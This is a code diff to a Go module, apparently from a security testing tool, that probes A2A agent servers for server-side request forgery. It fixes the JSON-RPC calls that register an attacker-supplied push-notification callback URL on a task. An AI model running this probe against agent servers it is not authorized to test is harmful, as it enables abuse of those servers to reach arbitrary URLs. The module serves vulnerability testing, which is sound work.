@@ -96,14 +96,19 @@ func (e *PushSSRFExecutor) Execute(ctx context.Context, target string, opts atta
 		// Got a task - try to register push notification config for it
 		taskID, _ := extractTaskContext(sendResp.Body)
 		if taskID != "" {
+			// params IS a TaskPushNotificationConfig, whose fields are taskId,
+			// url, token, id, tenant and authentication. The callback is named
+			// url; there is no pushNotificationUrl, and sending one earns
+			// -32602 "has no field named" from a2a-sdk v1, so this step never
+			// registered anything against a real v1 agent.
 			pushResp, pushErr := client.POST(ctx, endpoint, a2aHeaders, map[string]interface{}{
 				"jsonrpc": "2.0",
 				"id":      "batesian-push-" + vars.RandID,
 				"method":  "CreateTaskPushNotificationConfig",
 				"params": map[string]interface{}{
-					"taskId":              taskID,
-					"pushNotificationUrl": callbackURL,
-					"token":               token,
+					"taskId": taskID,
+					"url":    callbackURL,
+					"token":  token,
 				},
 			})
 			if pushErr == nil && pushResp.IsAccepted() {
@@ -113,15 +118,44 @@ func (e *PushSSRFExecutor) Execute(ctx context.Context, target string, opts atta
 		}
 	}
 
-	// Attempt 2: Legacy JSONRPC v0.3 tasks/send with embedded pushNotification config
+	// Attempt 2: JSON-RPC v0.3. message/send carries the callback inline under
+	// configuration, and tasks/pushNotificationConfig/set registers it against a
+	// task that already exists. Both are tried because a server may ignore the
+	// inline form.
+	//
+	// This used to send tasks/send, a v0.2-era method name. a2a-sdk answers it
+	// -32601 Method not found, so the whole v0.3 path was dead against any
+	// current server.
 	if !taskAccepted {
-		jsonrpcResp, err2 := client.POST(ctx, endpoint, map[string]string{}, buildJSONRPCRequest(callbackURL, token, vars.RandID))
-		if err2 == nil && jsonrpcResp.StatusCode != 404 {
+		sendResp2, err2 := client.POST(ctx, endpoint, map[string]string{}, buildV03SendRequest(callbackURL, token, vars.RandID))
+		if err2 == nil && sendResp2.StatusCode != 404 {
 			reached = true
 		}
-		if err2 == nil && jsonrpcResp.IsAccepted() {
-			taskAccepted = true
-			acceptedBinding = "JSONRPC/v0.3-tasks-send"
+		if err2 == nil && sendResp2.IsAccepted() {
+			// A task id is what makes this a registration rather than a plain
+			// echo: an agent that answers with a Message has nothing to attach a
+			// push config to, and claiming otherwise would have the rule wait
+			// for a callback nobody agreed to send.
+			if taskID, _ := extractTaskContext(sendResp2.Body); taskID != "" {
+				taskAccepted = true
+				acceptedBinding = "JSONRPC/v0.3-message-send"
+
+				setResp, setErr := client.POST(ctx, endpoint, map[string]string{}, map[string]interface{}{
+					"jsonrpc": "2.0",
+					"id":      "batesian-set-" + vars.RandID,
+					"method":  "tasks/pushNotificationConfig/set",
+					"params": map[string]interface{}{
+						"taskId": taskID,
+						"pushNotificationConfig": map[string]string{
+							"url":   callbackURL,
+							"token": token,
+						},
+					},
+				})
+				if setErr == nil && setResp.IsAccepted() {
+					acceptedBinding = "JSONRPC/v0.3-pushNotificationConfig-set"
+				}
+			}
 		}
 	}
 
@@ -203,27 +237,30 @@ func (e *PushSSRFExecutor) Execute(ctx context.Context, target string, opts atta
 	return findings, nil
 }
 
-// buildJSONRPCRequest creates the A2A task/send request body for JSONRPC binding.
-// Includes both pushNotificationConfig (v1.0 spec) and pushNotification (v0.3 legacy)
-// to maximize compatibility with real-world deployments.
-func buildJSONRPCRequest(callbackURL, token, taskID string) map[string]interface{} {
-	pushConfig := map[string]string{"url": callbackURL, "token": token}
+// buildV03SendRequest creates a v0.3 message/send carrying the push callback in
+// the configuration block, which is where that revision puts it. There is no
+// equivalent on the v1.0 side: SendMessageConfiguration has no
+// pushNotificationConfig field, so v1.0 registers the callback only through the
+// separate CreateTaskPushNotificationConfig call.
+func buildV03SendRequest(callbackURL, token, randID string) map[string]interface{} {
 	return map[string]interface{}{
 		"jsonrpc": "2.0",
-		"id":      "batesian-" + taskID,
-		"method":  "tasks/send",
+		"id":      "batesian-" + randID,
+		"method":  "message/send",
 		"params": map[string]interface{}{
-			"id": "batesian-" + taskID,
 			"message": map[string]interface{}{
-				"role": "user",
+				"role":      "user",
+				"messageId": "batesian-" + randID,
 				"parts": []interface{}{
-					map[string]string{"type": "text", "text": "ping"},
+					map[string]string{"kind": "text", "text": "ping"},
 				},
 			},
-			// v1.0 spec field name
-			"pushNotificationConfig": pushConfig,
-			// v0.3 legacy field name (some deployed servers use this)
-			"pushNotification": pushConfig,
+			"configuration": map[string]interface{}{
+				"pushNotificationConfig": map[string]string{
+					"url":   callbackURL,
+					"token": token,
+				},
+			},
 		},
 	}
 }
